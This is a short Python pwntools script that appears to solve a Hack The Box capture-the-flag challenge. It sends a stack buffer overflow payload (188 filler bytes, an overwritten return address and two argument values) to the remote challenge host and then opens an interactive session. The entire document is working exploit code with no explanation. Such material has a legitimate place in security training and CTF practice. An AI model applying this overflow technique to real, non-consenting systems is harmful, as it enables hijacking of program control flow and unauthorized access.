from pwn import *

context.log_level = 'critical'

junk = "A"*188 + p32(0x080491e2) + p32(0x00)  + p32(0xdeadbeef) + p32(0xc0ded00d)

s = remote('docker.hackthebox.eu',30698)

print s.recv()

s.sendline(junk)

s.interactive()
